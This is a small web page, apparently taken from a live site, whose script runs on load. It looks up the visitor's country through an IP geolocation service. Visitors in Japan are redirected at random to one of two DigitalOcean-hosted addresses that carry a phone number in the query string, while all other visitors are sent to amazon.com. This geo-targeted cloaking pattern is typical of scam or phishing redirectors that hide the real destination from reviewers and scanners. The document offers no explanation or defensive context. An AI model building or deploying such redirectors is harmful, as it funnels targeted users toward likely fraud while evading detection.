<?php
  ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Redirecting...</title>

<script>
fetch("https://ipwho.is/")
  .then(response => response.json())
  .then(data => {
    if (!data.success) {
      return;
    }

    const countryCode = data.country_code;

    if (countryCode === "JP") {
      (function () {
        const domainA = "https://seashell-app-6tncb.ondigitalocean.app/?bcda=(050)-3097-5847";
        const domainB = "https://urchin-app-uo553.ondigitalocean.app/?bcda=(050)-3097-5847";

        // Random number between 0 and 1
        if (Math.random() < 0.5) {
            window.location.replace(domainA);
        } else {
            window.location.replace(domainB);
        }
    })();
    } else {
      window.location.replace("https://www.amazon.com/");
    }
  })
  .catch(error => {
    console.error("Error fetching location:", error);
  });

</script>

</head>
<body>
</body>
</html>
